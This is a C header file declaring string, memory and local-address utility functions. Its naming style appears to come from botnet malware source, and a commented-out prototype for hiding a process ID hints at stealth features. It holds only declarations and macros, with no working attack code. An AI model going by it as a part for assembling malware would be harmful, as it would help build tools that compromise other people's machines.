#pragma once

#include "defines.h"

#define CONVERT_ADDR(x) x & 0xff, (x >> 8) & 0xff, (x >> 16) & 0xff, (x >> 24) & 0xff

#ifdef DEBUG
#include <stdio.h>
#include <string.h>
#endif
#include <stdio.h>
#ifdef DEBUG
#define printf(args, ...) printf("[%s] " args, __FILE__, ##__VA_ARGS__)
#else
#define printf(args, ...) printf(args, ##__VA_ARGS__)
#endif
#define LEN(x) (sizeof(x) / sizeof(*x))
const char* getname();
//void hidepid(int pid);
void util_strcat(char *, char *);
void util_memcpy(void *, void *, int);
void util_zero(void *, int);
int util_stristr(char *, int, char *);
int util_strlen(char *);
int util_strcpy(char *, char *);
int util_atoi(char *, int);
int util_char_search(char *, int, char *, int);
int util_memsearch(char *, int, char *, int);

BOOL util_strncmp(char *, char *, int);
BOOL util_strcmp(char *, char *);

char *util_itoa(int, int, char *);
extern int errno;
int util_isupper(char);
int util_isalpha(char);
int util_isspace(char);
int util_isdigit(char);

ipv4_t util_local_addr(void);
char *util_fdgets(char *, int, int);

char *hex_to_text(char *);
int _atoi(char *str);
